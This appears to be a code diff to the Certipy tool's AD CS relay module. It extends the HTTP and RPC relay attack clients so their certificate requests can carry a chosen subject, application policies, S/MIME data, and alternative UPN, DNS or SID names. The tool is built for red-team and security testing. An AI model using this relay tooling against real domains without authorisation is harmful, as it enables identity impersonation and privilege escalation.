@@ -26,7 +26,7 @@ import time
 import traceback
 from struct import unpack
 from threading import Lock
-from typing import Any, Literal, Optional, Tuple, Union, cast
+from typing import Any, List, Literal, Optional, Tuple, Union, cast
 
 import bs4
 import httpx
@@ -48,6 +48,7 @@ from certipy.lib.certificate import (
     cert_id_to_parts,
     cert_to_pem,
     create_csr,
+    create_csr_attributes,
     create_key_archival,
     create_pfx,
     csr_to_der,
@@ -60,7 +61,7 @@ from certipy.lib.certificate import (
     pem_to_key,
     x509,
 )
-from certipy.lib.constants import USER_AGENT
+from certipy.lib.constants import OID_TO_STR_NAME_MAP, USER_AGENT
 from certipy.lib.errors import translate_error_code
 from certipy.lib.files import try_to_save_file
 from certipy.lib.formatting import print_certificate_identifications
@@ -554,13 +555,15 @@ class ADCSHTTPAttackClient(ProtocolAttack):
             template = "Machine" if self.username.endswith("$") else "User"
 
         # Generate certificate signing request
-        # TODO: Add support for more parameters as with req.py
         csr, key = create_csr(
             self.username,
             alt_dns=self.adcs_relay.dns,
             alt_upn=self.adcs_relay.upn,
             alt_sid=self.adcs_relay.sid,
+            subject=self.adcs_relay.subject,
             key_size=self.adcs_relay.key_size,
+            application_policies=self.adcs_relay.application_policies,
+            smime=self.adcs_relay.smime,
         )
 
         # Handle key archival if specified
@@ -580,17 +583,12 @@ class ADCSHTTPAttackClient(ProtocolAttack):
             csr = csr_to_pem(csr).decode()
 
         # Build certificate attributes
-        attributes = [f"CertificateTemplate:{template}"]
-
-        # Add SAN attributes if specified
-        if self.adcs_relay.upn is not None or self.adcs_relay.dns is not None:
-            san = []
-            if self.adcs_relay.dns:
-                san.append(f"dns={self.adcs_relay.dns}")
-            if self.adcs_relay.upn:
-                san.append(f"upn={self.adcs_relay.upn}")
-
-            attributes.append(f"SAN:{'.'.join(san)}")
+        attributes = create_csr_attributes(
+            template,
+            alt_dns=self.adcs_relay.dns,
+            alt_upn=self.adcs_relay.upn,
+            alt_sid=self.adcs_relay.sid,
+        )
 
         attributes_str = "\n".join(attributes)
 
@@ -917,13 +915,15 @@ class ADCSRPCAttackClient(ProtocolAttack):
         )
 
         # Generate certificate signing request
-        # TODO: Add support for more parameters as with req.py
         csr, key = create_csr(
             self.username,
             alt_dns=self.adcs_relay.dns,
             alt_upn=self.adcs_relay.upn,
             alt_sid=self.adcs_relay.sid,
+            subject=self.adcs_relay.subject,
             key_size=self.adcs_relay.key_size,
+            application_policies=self.adcs_relay.application_policies,
+            smime=self.adcs_relay.smime,
         )
         self.key = key
         self.adcs_relay.key = key
@@ -943,17 +943,12 @@ class ADCSRPCAttackClient(ProtocolAttack):
             csr_data = csr_to_der(csr)
 
         # Build certificate attributes
-        attributes = [f"CertificateTemplate:{template}"]
-
-        # Add SAN attributes if specified
-        if self.adcs_relay.upn is not None or self.adcs_relay.dns is not None:
-            san = []
-            if self.adcs_relay.dns:
-                san.append(f"dns={self.adcs_relay.dns}")
-            if self.adcs_relay.upn:
-                san.append(f"upn={self.adcs_relay.upn}")
-
-            attributes.append(f"SAN:{'.'.join(san)}")
+        attributes = create_csr_attributes(
+            template,
+            alt_dns=self.adcs_relay.dns,
+            alt_upn=self.adcs_relay.upn,
+            alt_sid=self.adcs_relay.sid,
+        )
 
         # Submit certificate request
         cert = self.interface.request(csr_data, attributes)
@@ -1017,6 +1012,9 @@ class Relay:
         upn: Optional[str] = None,
         dns: Optional[str] = None,
         sid: Optional[str] = None,
+        subject: Optional[str] = None,
+        application_policies: Optional[List[str]] = None,
+        smime: Optional[str] = None,
         archive_key: Optional[str] = None,
         retrieve: Optional[int] = None,
         key_size: int = 2048,
@@ -1037,9 +1035,12 @@ class Relay:
             target: Target AD CS server (http://server/certsrv/ or rpc://server)
             ca: Certificate Authority name (required for RPC)
             template: Certificate template to request
-            upn: Alternative UPN for the certificate
-            dns: Alternative DNS name for the certificate
-            sid: Alternative SID for the certificate
+            upn: Alternative UPN (User Principal Name)
+            dns: Alternative DNS name
+            sid: Alternative SID (Security Identifier)
+            subject: Certificate subject name
+            application_policies: List of application policy OIDs
+            smime: SMIME capability identifier
             archive_key: Path to CAX certificate for key archival
             retrieve: Request ID to retrieve instead of requesting a new certificate
             key_size: RSA key size in bits
@@ -1060,6 +1061,7 @@ class Relay:
         self.upn = upn
         self.dns = dns
         self.sid = sid
+        self.subject = subject
         self.archive_key = archive_key
         self.request_id = int(retrieve) if retrieve else None
         self.key_size = key_size
@@ -1073,6 +1075,13 @@ class Relay:
         self.enum_templates = enum_templates
         self.kwargs = kwargs
         self.key: Optional[rsa.RSAPrivateKey] = None
+
+        # Convert application policy names to OIDs
+        self.application_policies = [
+            OID_TO_STR_NAME_MAP.get(policy.lower(), policy)
+            for policy in (application_policies or [])
+        ]
+        self.smime = smime
 
         self._request: Optional[Request] = None
 
@@ -1166,7 +1175,7 @@ class Relay:
                 timeout=self.timeout,
             ),
             ca=self.ca,
-            template=self.template,
+            template=self.template or "",
             upn=self.upn,
             dns=self.dns,
             sid=self.sid,
